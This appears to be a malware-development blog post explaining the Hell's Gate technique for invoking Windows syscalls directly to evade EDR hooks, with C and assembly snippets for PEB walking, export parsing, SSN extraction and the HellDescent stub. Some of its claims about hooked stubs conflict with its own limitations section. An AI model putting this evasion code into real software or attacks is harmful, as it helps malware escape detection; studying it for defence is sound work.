---
layout: post
title: "Syscall Series #1 - Hell's Gate"
date: 2026-08-26 09:00:00 +0200
tags: [Malware, Windows, Evasion]
author: Miguel Segura
categories: Malware Evasion
excerpt_separator: <!--more-->
---

EDR vendors have spent years hooking NTDLL functions to intercept suspicious API calls. Hell's Gate, published in 2019, offered a clean answer: skip NTDLL entirely and invoke syscalls directly, extracting the SSN from memory at runtime so nothing is hardcoded and no hook is ever hit.

<!--more-->

![Hell Gate](/assets/img/HellsGate/hellsGateIntro.png)

## Introduction

This post kicks off a series on Direct Syscall techniques:

- Syscall Series #1 - Hell's Gate
- Syscall Series #2 - Tartarus' Gate (coming soon)
- Syscall Series #3 - HellsHall (coming soon)
- Syscall Series #4 - VEH Syscalls (coming soon)

## Background

This technique was developed by Paul Laîné (@am0nsec) and smelly__vx (@RtlMateusz) in 2019. The code and the original paper can be found at [HellsGate](https://github.com/am0nsec/HellsGate).

Hell's Gate uses direct syscalls to bypass EDR hooks in ntdll.dll.

### Direct Syscalls

A syscall can take different types and numbers of arguments, but the basic structure looks like this:

```asm
mov r10, rcx
mov eax, SSN
syscall
```

For example, NtAllocateVirtualMemory on a 64-bit system will look like this:

![NtAllocateVirtualMemory syscall stub](/assets/img/HellsGate/syscallBasic.png)

Rather than calling a Windows API from within the NTDLL address space where hooks are installed, direct syscalls bypass that layer entirely.

### Heaven's Gate

To understand the motivation and name behind Hell's Gate, it helps to know the technique it takes its name from.

Heaven's Gate is a WoW64 mechanism that lets 32-bit code transition to 64-bit mode on x64 systems. On a 64-bit Windows machine, two execution modes coexist:

- IA32 (32-bit): segment 0x23
- x64 (64-bit): segment 0x33

Heaven's Gate allows 32-bit code to jump into 64-bit mode by switching segment selectors, without going through the kernel:

```asm
; Jump from 32-bit to 64-bit
push 0x33                   ; 64-bit segment selector
push offset code_64bit      ; Destination address
retf                        ; Far return jumps to 64-bit segment

code_64bit:
    mov eax, 0x50           ; System Service Number (SSN)
    syscall                 ; Execute syscall in 64-bit mode
```

The key is `retf`: it switches segments. 0x33 means 64-bit, 0x23 means 32-bit. This lets 32-bit shellcode execute 64-bit syscalls directly inside a WoW64 process, using a legitimate compatibility mechanism that does not look like a suspicious jump.

Hell's Gate borrows the concept of going directly to the syscall layer and extends it: instead of relying on a fixed segment trick, it dynamically extracts the SSN at runtime and calls the syscall from 64-bit code.

## Hell's Gate

Hell's Gate is a technique for executing direct syscalls. It works by dynamically locating and extracting the SSN (Syscall Service Number) from the bytecode of syscall stubs in memory, bypassing any hooks placed at the function entry point.

A Syscall Service Number (SSN) is the index that identifies each syscall in the kernel's service table (SSDT). When a function in NTDLL is called, that number tells the kernel which routine to dispatch to.

### How it works

SSNs are extracted dynamically at runtime rather than hardcoded, so the technique works across all Windows versions from 7 to 11. It has no dependencies on LoadLibrary, GetProcAddress, or any other commonly hooked function. EDRs typically hook the entry point of NTDLL functions, but Hell's Gate ignores that and reads the SSN directly from the internal bytecode, specifically the `mov eax, <SSN>` pattern, skipping the hook entirely.

### Walking the PEB

```c
PPEB pPeb = (PPEB)__readgsqword(0x60);  // GS register, offset 0x60
```

This gets a pointer to the Process Environment Block (PEB). On 64-bit Windows, the GS register always points to the TEB (Thread Environment Block), and at offset 0x60 is a pointer to the PEB.

### Traverse Module List to Find NTDLL

```c
PLDR_DATA_TABLE_ENTRY pLdrDataEntry = 
    (PLDR_DATA_TABLE_ENTRY)pPeb->LoaderData->InMemoryOrderModuleList.Flink - 0x10;
```

This walks the doubly-linked list of loaded modules stored in `LoaderData->InMemoryOrderModuleList` until it finds NTDLL.DLL.

### Parse PE Headers and Locate Export Directory

```
IMAGE_DOS_HEADER → e_lfanew → IMAGE_NT_HEADERS
  → IMAGE_OPTIONAL_HEADER → DataDirectory[0] (Export Directory)
```

This gives access to three tables:

- EAT (Export Address Table): function addresses
- ENT (Export Name Table): function name strings
- EOT (Export Ordinal Table): indices linking names to addresses

### Extracting the SSN

Each syscall stub follows a predictable pattern:

```asm
mov r10, rcx       ; NT calling convention
mov eax, <SSN>     ; The SSN is here (2 bytes)
syscall
```

Hell's Gate searches for the `mov eax, <SSN>` bytecode pattern (`0xB8`) and extracts the 2-byte SSN value:

```c
if (*((PBYTE)pFunctionAddress + 3) == 0xb8) {
    WORD wSystemCall = *(PWORD)((PBYTE)pFunctionAddress + 4);
}
```

Result: a lookup table mapping each function name to its SSN.

### Execute Direct Syscall

Once Hell's Gate has the SSN lookup table, it uses a companion function called HellDescent to execute the syscall directly from the attacker's code, bypassing NTDLL and any hooks on it.

Hell's Gate is the discovery mechanism (extracting SSNs dynamically). HellDescent is the execution mechanism (running the syscall). The execution is straightforward: load the SSN into EAX, set up the NT calling convention (r10 = rcx), and invoke syscall.

```asm
HellDescent PROC
    mov r10, rcx            ; NT calling convention: first arg goes into r10
    mov eax, wSystemCall    ; Load extracted SSN into EAX
    syscall                 ; Execute syscall directly
    ret
HellDescent ENDP
```

Call: `HellDescent(dwNtAllocateVirtualMemory_SSN, hProcess, &addr, dwSize, dwAllocType, dwProtect)`

### Implementation Deep-Dive: Bypassing Hooks, GetVxTableEntry and Boundary Validation 

**Bypassing Hooks: Traversing Over Instrumentation**

The critical insight of Hell's Gate is that it doesn't stop at the function entry point, it searches *byte-by-byte* through the entire function prologue until it finds the unhooked syscall pattern.

When an EDR hooks a syscall function, it typically injects code at the **entry point** (offset 0). This means the first few bytes may be part of the hook's trampoline, not the legitimate syscall stub. 

Hell's Gate handles this by incrementing the `cw` (current offset) variable on each loop iteration, effectively **stepping over the hook** until it finds the real syscall instructions.

```c
// Search byte-by-byte for the syscall pattern
for (WORD cx = 0; cx < pImageExportDirectory->NumberOfNames; cx++) {
    // ... find function by hash ...
    
    WORD cw = 0;
    while (TRUE) {
        // Check pattern at current offset (cw)
        if (*((PBYTE)pFunctionAddress + cw) == 0x4c     // MOV
            && *((PBYTE)pFunctionAddress + 1 + cw) == 0x8b    // R10,
            && *((PBYTE)pFunctionAddress + 2 + cw) == 0xd1    // RCX
            && *((PBYTE)pFunctionAddress + 3 + cw) == 0xb8    // MOV EAX,
            && *((PBYTE)pFunctionAddress + 6 + cw) == 0x00    // SSN high byte
            && *((PBYTE)pFunctionAddress + 7 + cw) == 0x00) { // (validation)
            
            BYTE high = *((PBYTE)pFunctionAddress + 5 + cw);
            BYTE low = *((PBYTE)pFunctionAddress + 4 + cw);
            pVxTableEntry->wSystemCall = (high << 8) | low;
            break;  // Found the unhooked syscall
        }
        
        cw++;  // Move one byte further into the function
    }
}
```

his Works Against Hooks

This works against hooks, because, even if the function entry point is instrumented, the syscall stub's core instructions (mov r10, rcx; mov eax, <SSN>) remain unchanged deep within the function.
By stepping through the function one byte at a time, Hell's Gate bypasses the hook entirely and finds the legitimate syscall pattern.

This is why Hell's Gate is called a "discovery" mechanism, it doesn't execute hooked code, it searches around it until it finds what it needs.


**GetVxTableEntry: Finding and Extracting**

The `GetVxTableEntry` function searches for a syscall stub by hash and extracts its SSN:

```c
BOOL GetVxTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, 
                     PVX_TABLE_ENTRY pVxTableEntry) {
    PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfFunctions);
    PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNames);
    PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNameOrdinals);

    for (WORD cx = 0; cx < pImageExportDirectory->NumberOfNames; cx++) {
        PCHAR pczFunctionName = (PCHAR)((PBYTE)pModuleBase + pdwAddressOfNames[cx]);
        PVOID pFunctionAddress = (PBYTE)pModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];

        if (djb2(pczFunctionName) == pVxTableEntry->dwHash) {
            pVxTableEntry->pAddress = pFunctionAddress;
            // Search for SSN in bytecode...
        }
    }
    return TRUE;
}
```

**SSN Extraction**

Once the function is found, it scans the bytecode looking for this pattern:

`0x4c 0x8b 0xd1 0xb8 <SSN low> <SSN high> 0x0f 0x05`

We can see the structure in a debugger:
![Hell's Gate Bytecode Pattern](/assets/img/HellsGate/patternBytecode.png)

```c
BYTE high = *((PBYTE)pFunctionAddress + 5 + cw);
BYTE low  = *((PBYTE)pFunctionAddress + 4 + cw);
pVxTableEntry->wSystemCall = (high << 8) | low;
```

**Boundary Check: Stopping Conditions**

The search loop has two stopping conditions to handle hooked or replaced functions:

```c
WORD cw = 0;
while (TRUE) {
    // Stop if syscall instruction found (scanned past the stub)
    if (*((PBYTE)pFunctionAddress + cw) == 0x0f && 
        *((PBYTE)pFunctionAddress + cw + 1) == 0x05)
        return FALSE;

    // Stop if function return found (function was completely replaced)
    if (*((PBYTE)pFunctionAddress + cw) == 0xc3)
        return FALSE;

    // Check for pattern and extract SSN...
    cw++;
}
```

If the function has been hooked or fully replaced, extraction fails cleanly rather than returning corrupted data.

## Limitations and what comes next

Hell's Gate assumes the expected bytecode pattern is present somewhere in the syscall stub. If an EDR completely replaces a function rather than just hooking its entry point, there is no recognizable bytecode to read and extraction fails.

This is exactly what Tartarus' Gate addresses. Instead of giving up when the pattern is not found, it looks at neighboring functions in the export table, since SSNs are sequential. If `NtAllocateVirtualMemory` is fully overwritten, the SSN can be inferred from `NtAllocateVirtualMemory-1` or `NtAllocateVirtualMemory+1`.

That is the next article in the series.

## References

- [Hell's Gate original paper and code](https://github.com/am0nsec/HellsGate) by Paul Laîné (@am0nsec) and smelly__vx (@RtlMateusz)
- [MalDev Academy](https://maldevacademy.com/)
